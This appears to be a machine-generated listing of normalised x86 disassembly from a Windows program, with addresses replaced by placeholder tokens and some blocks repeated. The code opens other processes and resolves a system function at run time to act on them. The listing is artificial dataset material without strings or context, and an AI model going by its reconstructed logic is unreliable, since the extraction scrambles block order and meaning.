mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
push 0x9
push ecx
mov eax edi
push eax
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0xc
push eax
call sub_40e950
add esp 0x8
push r--data
push r--data
call [ GetModuleHandleW@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push ebx
lea edx [ esp + 0x3c ]
push 0x1
push edx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0xb8 ] 0x2
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov [ esp + 0xa8 ] 0x1
cmp [ esp + 0x4c ] 0x8
jb r-xdata
mov ecx [ esp + 0x5c ]
push ecx
push ebx
push 0x800
call [ OpenProcess@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
cmp [ esp + 0x4c ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
push 0xa
mov ecx rw-data
call sub_408340
mov ecx [ rw-data ]
mov eax [ ecx + 0x4 ]
xor esi esi
test [ eax + rw-data ] 0x6
jne r-xdata
mov eax [ esp + 0x38 ]
push eax
call sub_43811c
add esp 0x4
cmp esi 0xffffffff
je r-xdata
mov esi 0x8
cmp [ esp + 0x30 ] esi
jb r-xdata
mov edx [ esp + 0x38 ]
push edx
call sub_43811c
add esp 0x4
push ebx
push eax
call sub_402d50
or eax 0x4
mov ecx [ rw-data ]
mov ecx [ ecx + 0x4 ]
add ecx rw-data
cmp esi ebx
je r-xdata
mov eax [ eax + rw-data ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push esi
call edi
test eax eax
push esi
sete bl
call [ CloseHandle@IAT ]
test bl bl
je r-xdata
xor ecx ecx
mov [ esp + 0xa8 ] 0xffffffff
mov [ esp + 0x30 ] 0x7
mov [ esp + 0x2c ] ebx
mov [ esp + 0x1c ] cx
cmp [ esp + 0x8c ] esi
jb r-xdata
mov eax [ esp + 0x1c ]
push eax
call sub_43811c
add esp 0x4
mov eax [ ecx + 0xc ]
or eax esi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov esi 0x4
xor ebx ebx
push r--data
push rw-data
call sub_409de0
add esp 0x8
xor ebx ebx
jmp r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
add eax 0x1c
mov [ esp + 0x14 ] eax
cmp eax [ ecx + 0x4 ]
jne r-xdata
mov edx [ esp + 0x78 ]
push edx
call sub_43811c
add esp 0x4
push ebx
push eax
call sub_402d50
jmp r-xdata
or eax 0x4
mov eax [ esp + 0x14 ]
sub_423010
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_452f73
mov eax [ fs : 0x0 ]
push eax
sub esp 0x90
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x88 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xa0 ]
mov [ fs : 0x0 ] eax
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov [ esp + 0x18 ] ecx
mov [ esp + 0x14 ] eax
cmp eax [ ecx + 0x4 ]
je r-xdata
mov al 0x1
mov ecx [ esp + 0xa0 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x88 ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn
jmp r-xdata
mov ecx 0x7
xor ebx ebx
xor edx edx
mov [ esp + 0x8c ] ecx
mov [ esp + 0x88 ] ebx
mov [ esp + 0x78 ] dx
mov [ esp + 0xa8 ] ebx
push ebx
mov [ esp + 0x34 ] ecx
xor ecx ecx
push eax
or eax 0xffffffff
lea edi [ esp + 0x24 ]
mov [ esp + 0x34 ] ebx
mov [ esp + 0x24 ] cx
call sub_401be0
mov edx edi
push edx
lea eax [ esp + 0x58 ]
mov [ esp + 0xac ] 0x1
call sub_40b340
add esp 0x4
test al al
je r-xdata
push ebx
lea edx [ esp + 0x3c ]
push 0x1
push edx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0xb8 ] 0x3
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
push 0x9
push ecx
mov eax edi
push eax
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0xc
push eax
call sub_40e950
add esp 0x8
push r--data
push r--data
call [ GetModuleHandleW@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push ebx
lea edx [ esp + 0x3c ]
push 0x1
push edx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0xb8 ] 0x2
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov [ esp + 0xa8 ] 0x1
cmp [ esp + 0x4c ] 0x8
jb r-xdata
mov ecx [ esp + 0x5c ]
push ecx
push ebx
push 0x800
call [ OpenProcess@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
cmp [ esp + 0x4c ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
push 0xa
mov ecx rw-data
call sub_408340
mov ecx [ rw-data ]
mov eax [ ecx + 0x4 ]
xor esi esi
test [ eax + rw-data ] 0x6
jne r-xdata
mov eax [ esp + 0x38 ]
push eax
call sub_43811c
add esp 0x4
cmp esi 0xffffffff
je r-xdata
mov esi 0x8
cmp [ esp + 0x30 ] esi
jb r-xdata
mov edx [ esp + 0x38 ]
push edx
call sub_43811c
add esp 0x4
push ebx
push eax
call sub_402d50
or eax 0x4
mov ecx [ rw-data ]
mov ecx [ ecx + 0x4 ]
add ecx rw-data
cmp esi ebx
je r-xdata
mov eax [ eax + rw-data ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push esi
call edi
test eax eax
push esi
sete bl
call [ CloseHandle@IAT ]
test bl bl
je r-xdata
xor ecx ecx
mov [ esp + 0xa8 ] 0xffffffff
mov [ esp + 0x30 ] 0x7
mov [ esp + 0x2c ] ebx
mov [ esp + 0x1c ] cx
cmp [ esp + 0x8c ] esi
jb r-xdata
mov eax [ esp + 0x1c ]
push eax
call sub_43811c
add esp 0x4
mov eax [ ecx + 0xc ]
or eax esi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov esi 0x4
xor ebx ebx
push r--data
push rw-data
call sub_409de0
add esp 0x8
xor ebx ebx
jmp r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
add eax 0x1c
mov [ esp + 0x14 ] eax
cmp eax [ ecx + 0x4 ]
jne r-xdata
mov edx [ esp + 0x78 ]
push edx
call sub_43811c
add esp 0x4
push ebx
push eax
call sub_402d50
jmp r-xdata
or eax 0x4
mov eax [ esp + 0x14 ]
sub_423340
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_452f28
mov eax [ fs : 0x0 ]
push eax
sub esp 0x68
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x60 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x78 ]
mov [ fs : 0x0 ] eax
push 0x10
call sub_438178
xor esi esi
add esp 0x4
cmp eax esi
je r-xdata
mov [ esp + 0x10 ] esi
mov ebx esi
mov ebx eax
mov [ eax ] esi
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] esi
mov [ esp + 0x10 ] ebx
jmp r-xdata
push esi
lea eax [ esp + 0x58 ]
push 0x1
push eax
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0x90 ] esi
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
push r--data
push rw-data
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
xor ecx ecx
mov edi ebx
call sub_40b0d0
test al al
je r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
cmp [ esp + 0x68 ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov edi [ ebx ]
cmp edi [ ebx + 0x4 ]
je r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
test ebx ebx
je r-xdata
mov edx [ esp + 0x54 ]
push edx
call sub_43811c
add esp 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
push 0x0
lea edx [ esp + 0x48 ]
push 0x5
push edx
call sub_4374b3
mov edx [ eax + 0xc ]
mov ecx [ rw-data ]
mov ecx [ ecx + 0x4 ]
add esp 0xc
push edx
mov edx [ eax + 0x8 ]
mov eax [ eax ]
add ecx rw-data
push edx
push ecx
call eax
mov ecx [ rw-data ]
mov edx [ ecx + 0x4 ]
add esp 0xc
push 0x0
lea ecx [ esp + 0x18 ]
mov eax 0x20
push 0x5
push ecx
mov [ edx + rw-data ] ax
call sub_4374b3
mov edx [ edi + 0x8 ]
add esp 0xc
push 0x9
push ecx
push edx
push rw-data
mov ebx eax
call sub_408170
add esp 0x4
push eax
call sub_40e950
mov esi eax
add esp 0x8
test esi esi
je r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
mov al 0x1
mov ecx [ esp + 0x78 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x60 ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
test eax eax
je r-xdata
mov ecx [ ebx + 0xc ]
mov edx [ ebx + 0x8 ]
push ecx
push edx
push eax
mov eax [ ebx ]
call eax
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
add esp 0xc
push 0x0
lea ecx [ esp + 0x28 ]
mov eax 0x20
push 0x5
push ecx
mov [ edx + esi + 0x40 ] ax
call sub_4374b3
mov edx [ edi + 0x18 ]
add esp 0xc
push 0x9
push ecx
push edx
push esi
mov ebx eax
call sub_408170
add esp 0x4
push eax
call sub_40e950
mov esi eax
add esp 0x8
test esi esi
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
xor eax eax
push ebx
mov [ ebx ] eax
mov [ ebx + 0x4 ] eax
mov [ ebx + 0x8 ] eax
call sub_43811c
add esp 0x4
mov ecx [ esp + 0x10 ]
mov edi [ ebx + 0x4 ]
push ecx
call sub_40cb00
mov edx [ ebx ]
add esp 0x4
push edx
call sub_43811c
add esp 0x4
mov ecx [ ebx + 0xc ]
mov edx [ ebx + 0x8 ]
push ecx
push edx
push eax
mov eax [ ebx ]
call eax
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
add esp 0xc
push 0x0
lea ecx [ esp + 0x38 ]
mov eax 0x20
push 0x5
push ecx
mov [ edx + esi + 0x40 ] ax
call sub_4374b3
mov edx [ edi + 0x14 ]
add esp 0xc
push 0x9
push ecx
push edx
push esi
mov ebx eax
call sub_408170
add esp 0x4
push eax
call sub_40e950
mov esi eax
add esp 0x8
test esi esi
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
mov ecx [ ebx + 0xc ]
mov edx [ ebx + 0x8 ]
push ecx
push edx
push eax
mov eax [ ebx ]
call eax
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
add esp 0xc
lea ecx [ edi + 0x24 ]
push ecx
push ecx
push 0x9
mov eax 0x20
mov [ edx + esi + 0x40 ] ax
mov edx [ edi + 0x1c ]
push ecx
push edx
push esi
call sub_424460
add esp 0x4
push eax
call sub_40e950
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor ebx ebx
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test ebx ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov edx [ esp + 0x10 ]
add edi 0x40
cmp edi [ edx + 0x4 ]
jne r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx 0x4
mov ebx edx
jmp r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
sub_4236f0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_452ee3
mov eax [ fs : 0x0 ]
push eax
sub esp 0xd8
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xd0 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xe8 ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov ecx [ esi ]
mov eax [ esi + 0x4 ]
xor ebx ebx
mov [ esp + 0x18 ] ebx
cmp ecx eax
je r-xdata
push 0x10
call sub_438178
add esp 0x4
cmp eax ebx
je r-xdata
sub eax ecx
mov ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
mov [ esp + 0x14 ] ebx
mov edi ebx
mov edi eax
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
mov [ esp + 0x14 ] edi
jmp r-xdata
lea ecx [ esp + 0x1c ]
push ecx
call sub_403ab0
mov [ esp + 0xf0 ] ebx
mov esi [ esi ]
lea edx [ esp + 0x2c ]
push esi
push edx
call sub_40a0a0
add esp 0x8
lea eax [ esp + 0x18 ]
push eax
lea ecx [ esp + 0x20 ]
push ecx
call sub_41b8f0
lea ecx [ esp + 0x1c ]
mov [ esp + 0xf0 ] 0xffffffff
call sub_403550
push ebx
lea eax [ esp + 0xc8 ]
push 0x1
push eax
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0x100 ] 0x1
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
test [ eax + esi + 0xc ] 0x6
jne r-xdata
push r--data
push rw-data
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
test [ eax + esi + 0xc ] 0x6
jne r-xdata
lea edx [ esp + 0x18 ]
push edx
push edi
call sub_40b5a0
add esp 0x8
test al al
je r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test ebx ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test ebx ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
cmp [ esp + 0xd8 ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx 0x4
mov ebx [ edi ]
cmp ebx [ edi + 0x4 ]
je r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx 0x4
xor esi esi
cmp edi esi
je r-xdata
mov edx [ esp + 0xc4 ]
push edx
call sub_43811c
add esp 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
lea edx [ ebx + 0x3c ]
push edx
mov edx [ ebx + 0x14 ]
push ecx
push 0x9
push ecx
lea eax [ ebx + 0x20 ]
push eax
push ecx
mov ecx [ ebx + 0x18 ]
push ecx
push ecx
push 0x9
push ecx
push edx
push rw-data
call sub_420bb0
add esp 0x4
push eax
call sub_40e950
add esp 0xc
push eax
call sub_408170
push eax
call sub_424670
add esp 0x8
push eax
call sub_40a0a0
add esp 0xc
push eax
call sub_40e950
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
mov al 0x1
mov ecx [ esp + 0xe8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0xd0 ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov eax [ edi ]
cmp eax esi
je r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push edi
mov [ edi ] esi
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] esi
call sub_43811c
add esp 0x4
mov ecx [ esp + 0x18 ]
mov ebx [ edi + 0x4 ]
push ecx
call sub_40cb40
mov edx [ edi ]
add esp 0x4
push edx
call sub_43811c
add esp 0x4
mov edx [ esp + 0x14 ]
add ebx 0x58
cmp ebx [ edx + 0x4 ]
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov edi edx
jmp r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
sub_423a10
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_452e93
mov eax [ fs : 0x0 ]
push eax
sub esp 0xa8
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xa0 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xb8 ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov eax 0x7
xor ebx ebx
xor ecx ecx
mov [ esp + 0x8c ] eax
mov [ esp + 0x88 ] ebx
mov [ esp + 0x78 ] cx
mov [ esp + 0xc0 ] ebx
xor edx edx
mov [ esp + 0x70 ] eax
mov [ esp + 0x6c ] ebx
mov [ esp + 0x5c ] dx
mov [ esp + 0xc0 ] 0x1
mov edi [ esi ]
mov ecx [ esi + 0x4 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
dec eax
je r-xdata
push ebx
push edi
lea edi [ esp + 0x80 ]
dec eax
jne r-xdata
push ebx
lea ecx [ esp + 0x98 ]
push 0x1
push ecx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0xd0 ] 0x5
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov edx [ esi ]
mov eax [ edx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ esp + 0x24 ]
push eax
push ebx
push 0x410
call [ OpenProcess@IAT ]
mov [ esp + 0x18 ] eax
cmp eax ebx
je r-xdata
mov esi 0x7
xor ecx ecx
mov [ esp + 0x54 ] esi
mov [ esp + 0x50 ] ebx
mov [ esp + 0x40 ] cx
lea edx [ esp + 0x78 ]
push edx
lea eax [ esp + 0x20 ]
mov [ esp + 0xc4 ] 0x2
call sub_40b340
add esp 0x4
test al al
je r-xdata
push ebx
push edi
or eax 0xffffffff
lea edi [ esp + 0x80 ]
call sub_401be0
mov ecx [ esi ]
mov esi [ esi + 0x4 ]
sub esi ecx
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov edi 0x8
cmp [ esp + 0x54 ] edi
jb r-xdata
cmp [ esp + 0x6c ] ebx
je r-xdata
lea eax [ ecx + 0x1c ]
push ebx
push eax
lea edi [ esp + 0x64 ]
jmp r-xdata
push r--data
call sub_435ac6
cmp [ esp + 0xa8 ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
xor ecx ecx
mov [ esp + 0x54 ] esi
mov [ esp + 0x50 ] ebx
mov [ esp + 0x40 ] cx
cmp [ esp + 0x70 ] edi
jb r-xdata
mov eax [ esp + 0x40 ]
push eax
call sub_43811c
add esp 0x4
push ebx
lea edx [ esp + 0x7c ]
push edx
or eax 0xffffffff
lea edi [ esp + 0x64 ]
call sub_401be0
cmp [ esp + 0x70 ] 0x8
mov eax [ esp + 0x5c ]
jae r-xdata
or eax 0xffffffff
call sub_401be0
mov esi 0x7
mov edx [ esp + 0x94 ]
push edx
call sub_43811c
add esp 0x4
push ebx
push eax
call sub_402d50
or eax 0x4
xor eax eax
mov [ esp + 0x70 ] esi
mov [ esp + 0x6c ] ebx
mov [ esp + 0x5c ] ax
cmp [ esp + 0x8c ] edi
jb r-xdata
mov edx [ esp + 0x5c ]
push edx
call sub_43811c
add esp 0x4
mov [ esp + 0x14 ] ebx
mov esi ebx
mov [ eax + 0x34 ] esi
mov [ eax + 0x30 ] ebx
xor ecx ecx
mov [ eax + 0x20 ] cx
mov [ eax + 0x50 ] esi
xor edx edx
mov esi eax
mov [ eax + 0x4c ] ebx
mov [ eax + 0x3c ] dx
mov [ esp + 0x14 ] esi
jmp r-xdata
cmp [ eax ] 0x2a
jne r-xdata
lea eax [ esp + 0x5c ]
mov al 0x1
mov ecx [ esp + 0xb8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0xa0 ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov ecx [ esp + 0x78 ]
push ecx
call sub_43811c
add esp 0x4
push ebx
lea eax [ esp + 0x98 ]
push 0x1
push eax
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0xd0 ] 0x3
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov edi eax
push 0xa
mov ecx edi
call sub_408340
mov ecx [ edi ]
mov eax [ ecx + 0x4 ]
xor esi esi
test [ eax + edi + 0xc ] 0x6
jne r-xdata
mov edx [ esp + 0x18 ]
push edx
mov eax esi
call sub_4241b0
add esp 0x4
jmp r-xdata
lea eax [ esp + 0x24 ]
push eax
lea ecx [ esp + 0x60 ]
push ecx
push esi
call sub_40b420
add esp 0xc
test al al
je r-xdata
push 0x58
call sub_438178
add esp 0x4
cmp eax ebx
je r-xdata
push 0x10
call sub_438178
add esp 0x4
cmp eax ebx
je r-xdata
mov ecx [ edi ]
mov ecx [ ecx + 0x4 ]
add ecx edi
cmp esi ebx
je r-xdata
mov eax [ eax + edi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
cmp esi ebx
je r-xdata
lea ecx [ esp + 0x24 ]
push ecx
push ebx
call sub_40b5a0
add esp 0x8
test al al
je r-xdata
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
mov ebx eax
cmp [ esp + 0xa8 ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax esi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov esi 0x4
mov eax [ esp + 0x18 ]
push eax
call [ CloseHandle@IAT ]
jmp r-xdata
push 0x1
call sub_40d2b0
mov eax [ esp + 0x18 ]
push eax
call [ CloseHandle@IAT ]
jmp r-xdata
push 0x0
lea eax [ esp + 0x98 ]
push 0x1
push eax
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0xd0 ] 0x4
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov esi [ ebx ]
cmp esi [ ebx + 0x4 ]
je r-xdata
mov esi [ esp + 0x14 ]
mov edx [ esp + 0x94 ]
push edx
call sub_43811c
add esp 0x4
push ebx
push eax
call sub_402d50
or eax 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
test ebx ebx
je r-xdata
lea ecx [ ecx ]
lea esi [ esp + 0x94 ]
call sub_4218d0
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
xor ebx ebx
mov esi ebx
call sub_40b550
mov edx [ esp + 0x18 ]
push edx
mov eax esi
call sub_4241b0
add esi 0x58
add esp 0x4
cmp esi [ ebx + 0x4 ]
jne r-xdata
jmp r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
sub_423ee0
push ebp
mov ebp esp
push 0xffffffff
push sub_452e38
mov eax [ fs : 0x0 ]
push eax
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x3c ] eax
mov eax [ eax ]
push eax
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_408170
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
mov ecx [ eax + esi + 0xc ]
xor edi edi
test cl 0x6
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov edx [ ebp - 0x3c ]
xor eax eax
push edx
lea edi [ ebp - 0x38 ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] eax
call sub_40b890
add esp 0x4
test al al
je r-xdata
push ebx
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_408170
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov edx [ esi ]
mov eax [ edx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
push 0x0
lea edx [ ebp - 0x30 ]
push 0x1
push edx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ ebp - 0x4 ] 0x0
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ebp - 0x34 ]
push eax
push ecx
push r--data
push rw-data
call sub_404c10
add esp 0xc
push eax
call sub_424460
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
